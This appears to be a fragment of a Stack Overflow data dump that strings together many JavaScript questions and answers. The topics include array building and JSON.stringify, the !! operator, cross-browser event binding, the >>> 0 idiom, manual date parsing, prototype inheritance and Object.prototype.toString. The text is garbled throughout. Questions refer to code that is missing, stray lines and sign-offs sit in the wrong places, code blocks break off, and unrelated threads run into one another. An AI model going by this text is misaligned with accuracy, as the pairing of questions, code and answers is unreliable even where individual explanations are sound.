    myJsonArray.push(myJsonHorse);
}
</code></pre>

<p>yeah my end goal is to have a single json array of all the horses after iterating over all the children - not sure if this should be done in plain javascript or in jquery?</p>

<p>Thanks</p>

<p>---------------- Edit -------------------</p>

<p>Sorry, my end goal is to then convert the array to a string, so I have one large json array converted to a string that I can submit to an ajax call that will get processed by my server.</p>
","5445","","<p>To declare an array you just need the Array Literal notation:</p>

<pre><code>var myArray = [];
</code></pre>

<p>The <code>push</code> method will work without problems.</p>

<p>Another possibility is to use the <a href=""http://api.jquery.com/map/"" rel=""nofollow""><code>$.map</code></a> method:</p>

<pre><code>var myArray = $(""#horses"").children().map(function (index, el) {
  return $(el).data('d');
}).get();
//  Will return an array containing:
//  [{""color"":""brown"",""speed"":""somewhat slow""},
//   {""color"":""brown"",""speed"":""somewhat slow""},
//   {""color"":""brown"",""speed"":""somewhat slow""}]
</code></pre>

<p>Check an example <a href=""http://jsbin.com/ohote4/2/edit"" rel=""nofollow"">here</a>.</p>

<p>Then to convert that array to a JSON string, you can use the <code>JSON.stringify</code> method (available natively on almost all browsers, for IE &lt; 8 you can use <a href=""https://github.com/douglascrockford/JSON-js/blob/master/json2.js"" rel=""nofollow"">json2.js</a>).</p>

"<p>I'm using the following function to get a URL parameter.</p>

","5445","","<p>For your second example, it actually doesn't return <code>null</code>, it returns an empty string.</p>

<p>Empty strings are <em>falsy</em>, they coerce to <code>false</code> in boolean context, so you could use this in the second branch of the ternary.</p>

<p>There you know that something was matched (in <code>results[1]</code>), and you can return <code>true</code> only if the match is <em>falsy</em> (an empty string):</p>

"<p>I'm getting the weirdest issues with Javascript in Firefox today.</p>

<p>The puzzling part of course is my temporary hack to fix the error. For some reason <code>.getElementsByTagName(""tr"")</code> is pulling back some functions also.</p>

<p>But then <code>bodyrows</code> does not contain just <code>&lt;tr&gt;</code> elements, it has the aforementioned junk in it.</p>

<p>Any thoughts?</p>

<p>To <strong>iterate</strong> over array-like elements like DOM Collections, a simple sequential loop is always recommend, the <code>for...in</code> statement is meant to be used to <strong>enumerate</strong> object properties.</p>

<p>Here is a snippet from Prototype Javascript Library :</p>

<pre><code>  Browser: (function(){
    var ua = navigator.userAgent;
    var isOpera = Object.prototype.toString.call(window.opera) == '[object Opera]';
    return {
      IE:             !!window.attachEvent &amp;&amp; !isOpera,
      Opera:          isOpera,
      WebKit:         ua.indexOf('AppleWebKit/') &gt; -1,
      Gecko:          ua.indexOf('Gecko') &gt; -1 &amp;&amp; ua.indexOf('KHTML') === -1,
      MobileSafari:   /Apple.*Mobile/.test(ua)
    }
  })(),
</code></pre>

<p>This is all good and i understand the objective of creating a browser object. One thing that caught my eye and I haven't been able to figure out is the use of double not operator <strong>!!</strong> in the IE property.</p>

<p>If you read through the code you will find it at many other places. I dont understand whats the difference between <code>!!window.attachEvent</code> and using just <code>window.attachEvent</code>.</p>

<p>Is it just a convention or is there more to it that's not obvious?</p>

<p>The key of understanding this, is to know that the <a href=""http://bclary.com/2004/11/07/#a-11.11"" rel=""nofollow"">Boolean Logical Operators</a> can return an operand, and not a Boolean result necessarily:</p>

<p>The Logical AND operator (<code>&amp;&amp;</code>), will return the value of the second operand if the first is truly:</p>

<pre><code>true &amp;&amp; ""foo""; // ""foo""
</code></pre>

<p>And it will return the value of the first operand if it is by itself falsy:</p>

<pre><code>undefined &amp;&amp; ""anything""; // undefined
NaN &amp;&amp; ""anything"";       // NaN
0 &amp;&amp; ""anything"";         // 0
</code></pre>

<p>So, in the snippet <code>!!window.attachEvent &amp;&amp; !isOpera</code>, we already know that <code>isOpera</code> is a boolean value, <code>!!</code> will just make sure that <code>Browser.IE</code> is a boolean result also.</p>

<p>An example: let's say we are in Firefox, <code>window.attachEvent</code> is <code>undefined</code> and <code>!isOpera</code> is <code>true</code>, if you don't use the double negation, <code>Browser.IE</code> would be <code>undefined</code> instead <code>false</code>.</p>

"<p>I have an object I created in JavaScript. Let's say it looks like this:</p>

<p>I have tried using call(), try() and bind() and I cannot get this to work. I need it so that, when the button is clicked, it goes back to the object's scope and not the html element's scope.</p>

<p>What am I missing here?</p>
","5445","","<p>The <code>this</code> value inside the click event handler refers to the DOM element, not to the object instance of your constructor.</p>

<p>You need to persist that value, also you refer to <code>MyButton.onButtonClick</code> I think you want to refer the <code>onButtonClick</code> method declared on <code>MyObject.prototype</code>:</p>

"<p>How to correctly do something like the following without using jQuery.</p>

<pre><code>   $(document).ready(function(){
      $(""#someButton"").click(function(){
        alert(""Hello"");
      });
   });
</code></pre>

<p><em>Thanks.</em></p>
","5445","","<p>The easiest way is:</p>

<pre><code>// DOM Level 0 way
window.onload = function () {
  document.getElementById(""someButton"").onclick = function() {
    alert(""Hello"");
  };
};
</code></pre>

<p>This will work on all browsers but note that with this approach only <em>one</em> event handler can be attached to an event.</p>

<p>Also notice that the <code>onload</code> event is not completely equivalent to the jQuery's <code>ready</code> event, <code>onload</code> will be fired when all the resources of the page are completely loaded (images, sub-frames, etc...), while <code>ready</code> fires as soon the DOM has been parsed.</p>

<p>If you want to attach multiple event handlers, you can use the <a href=""http://www.w3.org/TR/DOM-Level-2-Events/events.html"">DOM Level 2</a> Standard <a href=""https://developer.mozilla.org/en/DOM/element.addEventListener""><code>element.addEventListerner</code></a> method (or <a href=""http://msdn.microsoft.com/en-us/library/ms536343%28VS.85%29.aspx""><code>element.attachEvent</code></a> for IE)</p>

<p>The simplest abstraction to get a cross-browser way to bind events is:</p>

<pre><code>function addEvent(el, eventType, handler) {
  if (el.addEventListener) { // DOM Level 2 browsers
    el.addEventListener(eventType, handler, false);
  } else if (el.attachEvent) { // IE &lt;= 8
    el.attachEvent('on' + eventType, handler);
  } else { // ancient browsers
    el['on' + eventType] = handler;
  }
}
</code></pre>

<p>Then you can:</p>

<pre><code>var button = document.getElementById(""someButton"");
addEvent(button, 'click', function () {
  alert(""Hello"");
});

addEvent(button, 'click', function () {
  alert(""world!"");
});
</code></pre>

<p>Be aware also that the <code>addEventListener</code> and the IE's <code>attachEvent</code> methods have their differences, when you attach multiple handlers to an event with <code>addEventListener</code> they will be fired in the same order, as the handlers were bound (FIFO), <code>attachEvent</code> will trigger the handlers in the contrary order (LIFO).</p>

"<p>Can you explain how the JavaScript expression:</p>

<p>Replacing 1 with other JavaScript values seems to yield the same result.</p>

<ol>
<li><code>1 [{}]</code> is a Property Accessor, so it's covered in §11.2.1.</li>
<li><code>baseReference</code> is the result of evaluating <code>1</code>, so still <code>1</code>.</li>
<li><code>baseValue = GetValue(baseReference) == 1</code>.</li>
<li>At <code>GetValue</code> (§8.7.1), <code>Type(1)</code> is not <code>Reference</code> (a resolved name binding), so return 1.</li>
<li><code>propertyNameReference</code> is result of evaluating <code>{}</code>, so an empty object.</li>
<li><code>propertyNameValue = GetValue(propertyNameReference) == {}</code></li>
<li>At <code>CheckObjectCoercible(baseValue)</code> (§9.10), we return (Number is object-coercible).</li>
<li><code>propertyNameString = ToString(propertyNameValue)</code></li>
<li>At <code>ToString</code> (§9.8), return <code>ToString(ToPrimitive({}, hint String))</code></li>
<li>At <code>ToPrimitive</code> (§9.1), return result of object's <code>[[DefaultValue]]</code>, passing <code>PreferredType</code> (string).</li>
<li>At <code>[[DefaultValue]]</code> (§8.12.8), let toString be result of <code>[[Get]]</code> with argument <code>toString</code>.</li>
<li>This is defined at §15.2.4.2 to return <code>""[object "" + [[Class]] + ""]""</code>, where <code>[[Class]]</code> is ""Object"" for the default object prototype.  </li>
<li>Since there is a callable <code>toString</code>, we call it with argument <code>this</code> being  <code>{}</code>.</li>
<li>Return a value of type <code>Reference</code>, whose base value is <code>BaseValue</code> (1) and whose referenced name is <code>propertyNameString</code> (<code>""[object Object]""</code>).</li>
</ol>

<p>We then go to Array initializer (§11.1.4), and construct a single element array with the result.</p>

<p>It's perfectly valid JavaScript.</p>

<p>JavaScript handles object property names as strings, objects cannot contain other types or other objects as <em>keys</em>, they are just strings.</p>

<p>The bracket notation <a href=""http://bclary.com/2004/11/07/#a-11.2.1"">property accessor</a> (<code>MemberExpression [ Expression ]</code>) implicitly converts the expression between brackets into a string, so:</p>

<pre><code>var obj = {};
obj[{}] = ""foo"";
alert(obj[""[object Object]""]); // foo
</code></pre>

<p>In the above example you can see that I assign a value to the <code>{}</code> property, and <code>{}.toString()</code> (or <code>{}+''</code>) produces the string <code>""[object Object]</code> (via <a href=""http://bclary.com/2004/11/07/#a-15.2.4.2""><code>Object.prototype.toString</code></a>).</p>

<p>The expression <code>1 [{}]</code> implicitly converts the 1 <code>Number</code> primitive to an object (this is made by the property accessor) and it lookups a property named <code>""[object Object]""</code> the property lookup is made on the <code>Number.prototype</code> and the <code>Object.prototype</code> objects, for example:</p>

<pre><code>1['toString'] === Number.prototype.toString; // true
</code></pre>

<p>Finally, the <code>1 [{}]</code> expression is itself enclosed in brackets (<code>[1 [{}]]</code>), this is actually an Array literal.</p>

<p>In conclusion here is how the parser evaluates the expression:</p>

<pre><code> [1 [{}]];
 //   ^ The accessor expression is evaluated and converted to string

 [1 [""[object Object]""]];
 // ^ A property lookup is made on an Number object 
 //   trying to access a property named ""[object Object]""

 [undefined];
 //   ^ the property is obviously not found

   [undefined];
 //^         ^
 // An array literal is created with an element `0` which its value is `undefined`

<p>I don't quite understand why this is being done. What good does zero-fill right shifting <code>this.length</code> by <code>0</code> do? As far as I understand, it does exactly nothing. Is it to safely establish a default value for <code>len</code>, even if <code>this.length</code> is not an integer? Can this ever feasibly be the case? If so, what's the difference between <code>&gt;&gt; 0</code> and <code>&gt;&gt;&gt; 0</code>?</p>
","5445","","<p>The unsigned right shift operator is used in the all the <em>array extra's</em> method implementations of Mozilla, to ensure that the <code>length</code> property is a <em>unsigned 32-bit integer</em>.</p>

<blockquote>
  <p>Every Array object has a length property whose value is always a nonnegative integer less than 2<sup>32</sup>.</p>
</blockquote>

<p>This operator is the shortest way to achieve it, internally array methods use the <a href=""http://bclary.com/2004/11/07/#a-9.6""><code>ToUint32</code></a> operation, but that method is not accessible and exist on the specification for implementation purposes.</p>

<p>The Mozilla <em>array extras</em> implementations try to be <a href=""http://www.ecma-international.org/publications/standards/Ecma-262.htm"">ECMAScript 5</a> compliant, look at the description of the <code>Array.prototype.indexOf</code> method (&sect; 15.4.4.14):</p>

<pre>
1. Let O be the result of calling ToObject passing the this value 
   as the argument.
2. Let lenValue be the result of calling the [[Get]] internal method of O with 
   the argument ""length"".
3. Let len be <strong>ToUint32(lenValue)</strong>.
....

<p>As you can see, they just want to reproduce the behavior of the <code>ToUint32</code> method to comply with the ES5 spec on an ES3 implementation, and as I said before, the <a href=""http://bclary.com/2004/11/07/#a-11.7.3"">unsigned right shift operator</a> is the easiest way.</p>

"<p>In a project I am working on, I need to validate a date entered into an <code>&lt;input type=""date""&gt;</code></p>

<p>With Safari 4/5 (on Mac OSX) the Javascript fails to parse dates of the format <code>YYYY-MM-DD</code>, returning <code>NaN</code> instead of the expected epoch timestamp.</p>

<p>I am using the following technique to validate the field just before the form is submitted:</p>

<pre><code>//value = '2010-06-21'
var stamp = Date.parse(value);
if (isNaN(stamp)) {
    //notify user
} else {
    value = new Date(stamp).format_mysql();

<p>Replacing the <code>-</code>'s with <code>/</code>'s (YYYY/MM/DD) yields a ""correct"" timestamp.</p>

<p>I should note that the field should accept any date format, not just YYYY-MM-DD, and that though I would like to, I cannot use libraries like Date.js</p>

","5445","","<p>The behavior of the <a href=""http://bclary.com/2004/11/07/#a-15.9.4.2""><code>Date.parse</code></a> method is implementation dependent, on ECMAScript 5, this method can parse ISO8601 formatted dates, but I would recommend you to make the parsing manually.</p>

<p>Some time ago I've made a simple function, that can handle a format specifier argument:</p>

<pre><code>function parseDate(input, format) {
  format = format || 'yyyy-mm-dd'; // default format
  var parts = input.match(/(\d+)/g), 
      i = 0, fmt = {};
  // extract date-part indexes from the format
  format.replace(/(yyyy|dd|mm)/g, function(part) { fmt[part] = i++; });

  return new Date(parts[fmt['yyyy']], parts[fmt['mm']]-1, parts[fmt['dd']]);
}

parseDate('06.21.2010', 'mm.dd.yyyy');
parseDate('21.06.2010', 'dd.mm.yyyy');
parseDate('2010/06/21', 'yyyy/mm/dd');
parseDate('2010-06-21');
</code></pre>

<p>Also you could detect the ECMAScript 5 behavior to parse ISO formatted dates, you can check if the <code>Date.prototype.toISOString</code> is available, e.g.:</p>

<pre><code>if (typeof Date.prototype.toISOString == ""function"") {

","5445","","<p>This is made to assign a <em>default value</em>, in this case the value of <code>y</code>, if the <code>x</code> variable is <em>falsy</em>.</p>

","5445","","<p>For global code (code that is not part of any function), they are <em>almost</em> equivalent, both at the end create a property on the global object.</p>

<p>The difference is that <code>a</code>, which has been declared with the <code>var</code> statement, the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"">Variable Instantiation</a> process will use the global object as the <em>Variable Object</em> <sup>(1)</sup>, and it will define that property as non-deleteable on it, e.g.:</p>

<pre><code>var a = 13;
delete a; // false
typeof a; // ""number""
</code></pre>

<p>Then, <code>b</code> since the <code>this</code> value in global code, points to the global object itself, will be also a <em>global property</em>, but this one can be deleted:</p>

<pre><code>this.b = 21;
delete b; // true
typeof b; // ""undefined""
</code></pre>

<p><sub>Don't try the first snippet in Firebug, since the Firebug's console runs the code internally with <code>eval</code>, and in this execution context the variable instantiation process behaves differently, you can try it <a href=""http://jsbin.com/ugehe3/2/"">here</a>.</sub></p>

<p><sub>(1)</sub> The Variable Object (VO) is an object that is used by the variable instantiation process to define the identifiers of FunctionDeclarations, identifiers declared with the <code>var</code> statements, and identifiers of function formal parameters, in the different <a href=""http://bclary.com/2004/11/07/#a-10"">execution contexts</a>, all those identifiers are bound as properties of the VO, the Scope chain is formed of a list of VO's.</p>

<p>For global code, the VO is the global object itself, that's why <code>a</code> ends being a property of it. For function code, the VO (<em>also known as the <a href=""http://bclary.com/2004/11/07/#a-10.1.6"">Activation Object</a> for FunctionCode</em>), is a new object is created behind the scenes when you invoke a function, and that is what creates a new lexical scope, in short I'll talk about functions.</p>

<p>Both <code>a</code> and <code>this.b</code> can be <a href=""http://bclary.com/2004/11/07/#a-10.1.4"">resolved</a> simply as by <code>a</code> and <code>b</code> because the first object in the scope chain, is again the global object.</p>

<p>Also, I think is work knowing that the Variable Instantiation process takes place <em>before</em> than the code execution, for example:</p>

<pre><code>alert(a); // undefined, it exists but has no value assigned to it yet
alert(b); // ReferenceError is thrown

var a = 13;
this.b = 21;
</code></pre>

<p>These differences may be trivial but I think is worth knowing them.</p>

<p>Now, if the code snippet you posted is within a function, it is <em>completely different</em>.</p>

<p>The <code>a</code> identifier, declared with the <code>var</code> statement in your example will be a <em>local variable</em>, available only to the lexical scope of the function (and any nested functions).</p>

<p>Keep in mind that in JavaScript blocks don't introduce a new scope, only functions do, and to declare a variable in that scope, you should <em>always</em> use <code>var</code>.</p>

<p>The <code>this.b</code> identifier will become a property bound to the object that is referred by the <code>this</code> value, but... <em>What is <code>this</code>???</em>.</p>

<p>The <code>this</code> value in JavaScript is implicitly set when you call a function, it is determined by how do you invoke it:</p>

<ol>
<li><p>When you use the <code>new</code> operator, the <code>this</code> value inside the function, will point to a newly created object, e.g.:</p>

<pre><code>function Test() {
  this.foo = ""bar"";
}
var obj = new Test(); // a new object with a `foo` property
</code></pre></li>
<li><p>When you call a function that is <em>member</em> of an object, the <code>this</code> value inside that function will point to the <em>base object</em>, e.g.:</p>

<pre><code>var obj = {
  foo: function () {
    return this == obj;
  }
};
obj.foo(); // true
</code></pre></li>
<li><p>When you invoke a function without any base object, the <code>this</code> value will refer to the global object:</p>

<pre><code>function test() {
  return this == window;
}
test(); // true
</code></pre></li>
<li><p>The <code>this</code> value can be set explicitly, when you invoke a function using <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/call""><code>call</code></a> or <a href=""https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Objects/Function/apply""><code>apply</code></a>:</p>

"<p>I'm writing a simple platform game using javascript and html5.  I'm using javascript in an OO manner.  To get inheritance working i'm using the following;</p>

<pre><code>// http://www.sitepoint.com/blogs/2006/01/17/javascript-inheritance/
function copyPrototype(descendant, parent) {
    var sConstructor = parent.toString();
    var aMatch = sConstructor.match(/\s*function (.*)\(/);
    if (aMatch != null) { descendant.prototype[aMatch[1]] = parent; }
    for (var m in parent.prototype) {
        descendant.prototype[m] = parent.prototype[m];
    }
};
</code></pre>

<p>For the sake of this post consider the following example;</p>

<pre><code>function A() {
 this.Name = 'Class A'
}
A.prototype.PrintName = function () {
 alert(this.Name);
}

function B() {
 this.A();
}
copyPrototype(B, A);

function C() {
 this.B();
}
copyPrototype(C, B);

var instC = new C();

if (instC instanceof A)
  alert ('horray!');
</code></pre>

<p>As I understand it I would expect to see a horray alert box, because C is an instance of C &amp; B &amp; A.  Am I wrong?  Or am I just using the wrong method to check?  Or has copyPrototype knackered the instanceof operator?</p>

<p>Thanks as always for taking the time to read this!</p>

<p>Shaw.</p>
","5445","","<p>The problem is that the <code>copyPrototype</code> function only copies the properties from a constructors prototype to another one, for example, at the end, the intenal <code>[[Prototype]]</code> link of <code>C.prototype</code> simply points to <code>Object.prototype</code>.</p>

<p>The prototype chain of <code>instC</code> and constructor's prototypes look like this:</p>

<pre>
                [[Prototype]]
    A.prototype -------------->|-------------------|
                               |                   |
    B.prototype -------------->|  Object.prototype | ---> null
                               |                   |
    C.prototype -------------->|-------------------|
        ^
        |
      <strong>instC</strong>

</pre>

<p>The <code>instanceof</code> operator traverses the prototype chain, your <code>instC</code> object, as you can see, will have on its prototype chain only <code>C.prototype</code> and <code>Object.prototype</code>.</p>

<p>You can achieve what you want by setting your constructor's prototypes to be object instances of their ""parent"" constructors, for example:</p>

<pre><code>function A() {
  this.Name = 'Class A'
}

A.prototype.PrintName = function () {
  alert(this.Name);
}

function B() {
  //..
}
B.prototype = new A();
B.prototype.constructor = B; // fix constructor property


function C() {
  //..
}

C.prototype = new B();
C.prototype.constructor = C; // fix constructor property

var instC = new C();
if (instC instanceof A)
  alert('horray!');
</code></pre>

<p>Now the prototype chain of the <code>instC</code> object looks like this:</p>

<pre>
           ---------------        ---------------        ---------------
 <strong>instC</strong> --> | C.prototype | -----> | B.prototype | -----> | A.prototype |
           ---------------        ---------------        ---------------
                                                                |
                                                                V
                                                       --------------------
                                                       | Object.prototype |
                                                       --------------------
                                                                |

"<p>Does executing javascript within a browser in 'strict mode' make it more performant, in general? Do any of the major browsers do additional optimisation or use any other techniques that will improve performance in strict mode?</p>

<p>Edit: Since <a href=""http://kangax.github.com/es5-compat-table/"">none of the major engines actually implement strict mode</a>, I'll rephrase slightly: Is strict mode intended, amongst its other goals, to allow browsers to introduce additional optimisations or other performance enhancements?</p>
","5445","","<p>The <em>strict mode</em> is not really about performance, it a <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_4.2.2""><em>strict variant</em></a> of the language, its <em>main goal</em> is to avoid what are considered to be <em>error-prone features</em>.</p>

<p>Basically its goal is to make the language <em>safer</em>, introducing are a lot of semantical changes, also additional error checking is made, and erros are noisy, in non-strict code things only silently fail.</p>

<p>About performance, I think browser vendors are now having a hard time now implementing strict mode, the problem is that the JS engines are mostly based on ECMAScript 3, and implementing the strict mode is not easy, since the scope of <em>strictness</em> is very flexible, you can mix non-strict and strict code.</p>

NaN &amp;&amp; ""anything""; // NaN
0 &amp;&amp; ""anything"";   // 0

<p>For example, if you invoke <code>foo.bar.func();</code>, the <code>this</code> value inside <code>func</code> will refer to the <code>foo.bar</code> object, there is no way to determine dynamically if <code>this</code> belongs to <code>foo</code>, without explicitly checking all properties of <code>foo</code> (and of course knowing beforehand where to check).</p>

","5445","","<p><strong>First question:</strong></p>

<p>No because the <code>i</code> variable is incremented <em>after</em> the last successful iteration, then the condition is checked and it evaluates to <code>false</code> so the loop ends.</p>

<p>The <code>for</code> statement is composed by:</p>

<pre><code>for ([initialExpression]; [condition]; [incrementExpression])
  statement
</code></pre>

<p>And it is executed in the following steps:</p>

<ol>
<li>The <code>initialExpression</code> is evaluated at the start</li>
<li>The <code>condition</code> is evaluated, if it evaluates to <code>false</code>, the loop ends, if it evaluates to <code>true</code>, the statement is evaluated.</li>
<li>Evaluate the statement.</li>
<li>The <code>incrementExpression</code> is evaluated, go to step 2. </li>
</ol>

<p><strong>Second question:</strong></p>

<p>The function is executed asynchronously <strong>after</strong> the loop has ended, at this time as you know <code>i</code> contains <code>3</code>.</p>

<p>The common workaround for this is to use a function to preserve the value of the looping variable on each iteration, for example:</p>

"<p>I've come across a peculiarity with Douglas Crockfords Object.create method which I'm hoping someone might be able to explain:</p>

<p>If I then change the name values of the second object - 'anotherPerson' - it also changes the name value of the initial 'person' object.</p>

<p>This only happens when the properties are nested, this code should give you an idea of what I mean:</p>

<pre><code>if (typeof Object.create !== 'function') {
    Object.create = function (o) {
        function F() {}
        F.prototype = o;
        return new F();
    };

// initiate new 'person' object
var person = {
    name: {
        first: 'Ricky',
        last: 'Gervais'
    },
    talk: function() {
        console.log('my name is ' + this.name.first + ' ' + this.name.last);
    }
}

// create anotherPerson from person.prototype
var anotherPerson = Object.create(person);
// change name of anotherPerson
anotherPerson.name.first = 'Stephen';
anotherPerson.name.last = 'Merchant';

// call talk method of both 'person' and 'anotherPerson' objects
person.talk(); // oddly enough, prints 'Stephen Merchant'
anotherPerson.talk(); // prints 'Stephen Merchant'

<p>If I were to store the name values without nesting then this odd behaviour does not occur -- e.g.</p>

<pre><code>// initiate new 'person' object
var person = {
    firstName: 'Ricky',
    lastName: 'Gervais',
    talk: function() {
        console.log('my name is ' + this.firstName + ' ' + this.lastName);

var anotherPerson = Object.create(person);
// change name of anotherPerson
anotherPerson.firstName = 'Stephen';
anotherPerson.lastName = 'Merchant';

// call talk method of both 'person' and 'anotherPerson' objects
person.talk(); // prints 'Ricky Gervais'
anotherPerson.talk(); // prints 'Stephen Merchant'

<p>I'd be much appreciative if anyone's able to explain why this occurs!?</p>
","5445","","<p>That happens because <code>anotherPerson.name</code> is an object and it is stored upper in the prototype chain, on the original <code>person</code> object:</p>

person.name === anotherPerson.name; // true, the same object reference

<p>Thanks,<br>
Alex</p>
","5445","","<p>Well, I think the problem is that your constructor function is not returning anything.</p>

<p>When you use the <code>new</code> operator, if the constructor function, does not return an object, the <code>this</code> value, which is the newly created object is returned implicitly, for example:</p>

<pre><code>function Foo () {
  this.foo = 'bar';
}

new Foo(); // { foo: 'bar' }
</code></pre>

<p>If you invoke the function with call/apply, it will yield <code>undefined</code>, since there is no return value at all:</p>

<pre><code>Foo.call({}); // undefined
</code></pre>

<p>So, the solution would be to return the <code>this</code> value on your constructor, e.g.:</p>

<pre><code>function Bar() {
  this.bar =  'baz';
  //..
  return this;
}

Bar.call({}); // { bar: 'baz' }
</code></pre>

<p>Also, remember that using the <code>new</code> operator is not completely equivalent to <em>apply</em> a function using a new object as the <code>this</code> value, because when you use the <code>new</code> operator, the newly created object will <em>inherit</em> from its constructor's prototype, e.g.:</p>

<pre><code>new Bar() instanceof Bar; // true
Bar.call({}) instanceof Bar; // false
</code></pre>

<p>But how do I get the functions working the other way?</p>

<p>Thanks.</p>

<p>Shao</p>
","5445","","<p>You need to parse each octet back to number, and use that value to get a character, something like this:</p>

<pre><code>function bin2String(array) {
  var result = """";
  for (var i = 0; i &lt; array.length; i++) {
    result += String.fromCharCode(parseInt(array[i], 2));
  }
  return result;
}

bin2String([""01100110"", ""01101111"", ""01101111""]); // ""foo""

// Using your string2Bin function to test:
bin2String(string2Bin(""hello world"")) === ""hello world"";
</code></pre>

<p><strong>Edit:</strong> Yes, your current <code>string2Bin</code> can be written more shortly:</p>

<pre><code>function string2Bin(str) {
  var result = [];
  for (var i = 0; i &lt; str.length; i++) {
    result.push(str.charCodeAt(i).toString(2));
  }
  return result;
}
</code></pre>

<p>But by looking at the documentation you linked, I think that the <code>setBytesParameter</code> method expects that the blob array contains the decimal numbers, not a <em>bit string</em>, so you could write something like this:</p>

<pre><code>function string2Bin(str) {
  var result = [];
  for (var i = 0; i &lt; str.length; i++) {
    result.push(str.charCodeAt(i));
  }
  return result;
}

function bin2String(array) {
  return String.fromCharCode.apply(String, array);
}

string2Bin('foo'); // [102, 111, 111]
bin2String(string2Bin('foo')) === 'foo'; // true

"<p>Once the page has been loaded, I would like to append an additional  element for each existing  elements on the page. </p>

<p>Just a warning this will actually <strong>freezes the browser</strong> because the divs variable is dynamic and divs.length just gets larger and larger each time the loop goes.</p>

<p>Is there a way to determine the number of tags when the DOM is normally loaded for the first time and have a chance to work with the elements statically.</p>

<p>I can't there of another solution so far.</p>

<p>Thanks so much.

","5445","","<p>The problem is that DOM collections are <a href=""http://www.w3.org/TR/DOM-Level-2-HTML/glossary.html"" rel=""nofollow""><em>live</em></a>, and when the underlying document structure is changed, it will be reflected automatically on the collection, that's why when the <code>length</code> property is accessed it will contain a new length, a common approach is to <em>cache</em> the length before starting the loop:</p>

<pre><code>var divs=document.getElementsByTagName('div');

for(var i = 0, len = divs.length;i&lt;len;i++){
    var newDiv = document.createElement('div');
    divs[i].appendChild(newDiv);
}
</code></pre>

<p><sub>Also notice that you should declare all your variables with the <code>var</code> statement, otherwise it might become global.</sub></p>

<p><strong>Edit:</strong> In this case, since you are appending child nodes of the same tagName, the collection will be modified, and the indexes <em>will no longer match</em>, after the first iteration, the index <code>1</code> will refer to the <code>newDiv</code> object from the previous iteration, as <a href=""http://stackoverflow.com/questions/3198540/appending-elements-to-dom-in-a-loop-structure/3198624#3198624"">@Casey</a> recommends it will be safer to convert the collection to a plain array before traversing it.</p>

<p>I use the following function: </p>

<pre><code>function toArray(obj) {
  var array = [];
  // iterate backwards ensuring that length is an UInt32
  for (var i = obj.length &gt;&gt;&gt; 0; i--;) { 
    array[i] = obj[i];
  }
  return array;
}

var divs = toArray(document.getElementsByTagName('div'));

","5445","","<p>My conjecture:</p>

<p>The concept of the <code>arguments</code> object has been on the language since the very beginning, it's even described in the <a href=""http://www.mozilla.org/js/language/E262.pdf"">ECMAScript First Edition Standard</a><sub>(PDF)</sub>.</p>

<p>But the <code>Array.prototype</code> object was extended in the next versions of the standard, now on ES5, Array objects have methods such as <code>map</code>, <code>reduce</code>, <code>every</code>, <code>some</code>, etc, that are <em>really powerful</em>.</p>

<p>The last year, there was a proposal in ES5 to make <code>arguments</code> inherit from <code>Array.prototype</code>, in the draft stages of the standard, but was dropped off time later.</p>

<p>In those drafts, <code>arguments</code> inherited from <code>Array.prototype</code>, but for backwards compatibility with ES3, the <code>arguments</code> object had defined two own properties, <code>toString</code> and <code>toLocaleString</code>, both pointing to the same methods on <code>Object.prototype</code>, but finally, the committee decided to keep inheriting from <code>Object.prototype</code>.</p>

<p>Thanks!!</p>
","5445","","<p>The <code>call</code> method sets the <code>this</code> value of the invoked function to the object passed as first argument, in your example, you are executing the <code>Object.prototype.toString</code> method on an Array object.</p>

<p>Array objects, have their own <code>toString</code> method (<code>Array.prototype.toString</code>) that shadows the one from <code>Object.prototype</code>, if you call <code>[].toString();</code> the method on the <code>Array.prototype</code> will be invoked.</p>

<p>For example:</p>

<pre><code>function test() {
  alert(this);
}
test.call(""Hello""); // alerts ""Hello""
</code></pre>

<p>Another example:</p>

<pre><code>var alice = {
  firstName: 'Alice',
  lastName: 'Foo',
  getName: function () {
    return this.firstName + ' ' + this.lastName;
  }
};

var bob = {
  firstName: 'Bob',
  lastName: 'Bar',
};

alice.getName.call(bob); // ""Bob Bar""
</code></pre>

<p>In the above example, we use the Alice's <code>getName</code> method on the Bob's object, the <code>this</code> value points to <code>bob</code>, so the method works just as if it were defined on the second object.</p>

<p>Now let's talk about the <code>Object.prototype.toString</code> method. All native objects in JavaScript contain an <em>internal property</em> called <code>[[Class]]</code> this property contains a string value that represents the specification defined <em>classification</em> of an object, the possible values for <em>native</em> objects are:</p>

<ul>
<li><code>""Object""</code></li>
<li><code>""Array""</code></li>
<li><code>""Function""</code></li>
<li><code>""Date""</code></li>
<li><code>""RegExp""</code></li>
<li><code>""String""</code></li>
<li><code>""Number""</code></li>

<li><code>""Error""</code> for error objects such as instances of <code>ReferenceError</code>, <code>TypeError</code>, <code>SyntaxError</code>, <code>Error</code>, etc</li>
<li><code>""Math""</code> for the global <code>Math</code> object</li>

<p>As I've said before that property is <em>internal</em>, there is no way to change it, the specification doesn't provide any operator or built-in function to do it, and the <em>only</em> way you can access its value is through the <code>Object.prototype.toString</code> method.</p>

<p>This method returns a string formed by:</p>

<pre><code>""[object "" + this.[[Class]] + ""]""
</code></pre>

<p><sub>Only for expository purposes because <code>[[Class]]</code> cannot be accessed directly.</sub></p>

<p>For example:</p>

<pre><code>Object.prototype.toString.call([]);       // ""[object Array]""
Object.prototype.toString.call(/foo/);    // ""[object RegExp]""
Object.prototype.toString.call({});       // ""[object Object]""
Object.prototype.toString.call(new Date); // ""[object Date]""
// etc...
</code></pre>

<p>This is really useful to detect the <em>kind</em> of an object in a safe way, for detecting array objects, it's the most widely used technique:</p>

<pre><code>function isArray(obj) {
  return Object.prototype.toString.call(obj) == '[object Array]';
}
</code></pre>

<p>It might be tempting to use the <code>instanceof</code> operator, but that way will lead to problems if you work on <em>cross-frame</em> environments, because an array object created on one frame, will not be <code>instanceof</code> the <code>Array</code> constructor of another.</p>

<p>The above method will work without any problems, because the object will contain the value of its <code>[[Class]]</code> internal property intact.</p>

"<p>Is it possible to subclass and inherit from javascript Arrays?</p>

<p>I'd like to have my own custom Array object that has all the features of an Array, but contains additional properties.  I'd use <code>myobj instanceof CustomArray</code> to perform specific operations if the instance is my CustomArray.</p>

